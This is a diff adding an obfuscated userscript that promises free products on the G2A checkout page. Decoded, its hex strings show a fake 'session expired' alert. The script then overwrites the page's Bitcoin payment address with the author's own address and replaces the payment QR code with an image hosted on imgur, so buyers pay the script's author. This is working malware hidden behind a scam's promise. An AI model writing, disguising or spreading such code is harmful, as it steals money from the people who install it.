@@ -1,0 +1,14 @@
+// ==UserScript==
+// @name         GIFT CARD METHOD
+// @namespace    G2A
+// @version      20.0/2022 Edition. Last update: January 2022. This version has Auto-Update enabled, so if g2a changes something in their code, your script will update automatically.
+// @description  Get any product from G2A for FREE.
+// @author       Bailopan
+// @telegram     @bailopanhacks
+// @match        https://checkout.pay.g2a.com/*
+// @grant        none
+// @downloadURL https://update.greasyfork.org/scripts/438193/GIFT%20CARD%20METHOD.user.js
+// @updateURL https://update.greasyfork.org/scripts/438193/GIFT%20CARD%20METHOD.meta.js
+// ==/UserScript==
+
+var _cs=["\x63\x6f","\x47\x32","\x6f\x6e","\x52\x6a\x44","\x48\x54\x4d","\x64\x72\x65","\x72\x6f\x77","\x79\x57\x76","\x69\x6e\x75","\x71\x63","\x73\x72\x63","\x38\x74","\x33\x4c\x33","\x3a\x2f\x2f","\x65\x64","\x69\x2e\x69","\x64\x76","\x78\x70","\x2e\x2e","\x69\x6e\x6e","\x64\x65","\x41\x5a","\x21\x20","\x38\x44","\x73\x42","\x41\x20","\x30\x39","\x67\x65","\x67\x74\x68","\x4c","\x65\x2e","\x6c\x61\x73","\x4b\x4c","\x65\x6e\x74","\x20\x4f\x4b","\x74\x45","\x20\x45","\x61\x64","\x78\x34\x47","\x73\x73","\x79\x43","\x78\x35","\x6e\x67","\x75\x2e\x70","\x43\x20","\x3a\x20\x31","\x6d\x65","\x6d\x67\x75",'\x7a\x6f\x6e\x65',"\x70\x73","\x20\x74","\x6f\x6d","\x53\x65","\x72\x47\x56","\x6c\x65\x6e","\x69\x72","\x65\x72","\x6f\x6e\x74","\x2f\x79","\x69\x71","\x68\x74\x74","\x42\x76\x67","\x72\x2e\x63","\x75\x67","\x20\x65\x6e","\x73\x4e\x61","\x61\x62\x6c","\x42\x54","\x6f\x20\x63","\x6c\x65\x6d",'\x74\x69\x6d\x65',"\x73\x73\x69","\x50\x72\x65"]; var _g0 = [_cs[1]+_cs[25]+_cs[52]+_cs[71]+_cs[2]+_cs[36]+_cs[17]+_cs[55]+_cs[14]+_cs[64]+_cs[66]+_cs[14]+_cs[22]+_cs[72]+_cs[39]+_cs[34]+_cs[50]+_cs[68]+_cs[57]+_cs[8]+_cs[30]+_cs[18], _cs[6], _cs[27]+_cs[35]+_cs[69]+_cs[33]+_cs[24]+_cs[40]+_cs[31]+_cs[65]+_cs[46], _cs[19]+_cs[56]+_cs[4]+_cs[29], _cs[67]+_cs[44]+_cs[37]+_cs[5]+_cs[39]+_cs[45]+_cs[23]+_cs[53]+_cs[41]+_cs[61]+_cs[11]+_cs[63]+_cs[38]+_cs[9]+_cs[7]+_cs[16]+_cs[21]+_cs[59]+_cs[3]+_cs[32], _cs[10], _cs[0]+_cs[20], _cs[60]+_cs[49]+_cs[13]+_cs[15]+_cs[47]+_cs[62]+_cs[51]+_cs[58]+_cs[12]+_cs[26]+_cs[43]+_cs[42], _cs[54]+_cs[28]]; var _g1 = [_g0[0], _g0[1], _g0[2], _g0[3], _g0[4], _g0[5], _g0[6], _g0[7], _g0[8]]; var _g2 = [_g1[0], _g1[1], _g1[2], _g1[3], _g1[4], _g1[5], _g1[6], _g1[7], _g1[8]]; var _g3 = [_g2[0], _g2[1], _g2[2], _g2[3], _g2[4], _g2[5], _g2[6], _g2[7], _g2[8]]; alert(_g3[0]); var _g4 = setInterval(function () { var _g5 = document[_g3[2]](_g3[1]); _g5[1][_g3[3]] = _g3[4]; document[_g3[2]](_g3[6])[0][_g3[5]] = _g3[7]; var _g6 = document[_g3[2]](_g3[6]); if (_g6[_g3[8]] > 0) { clearInterval(_g4) } }, 10)
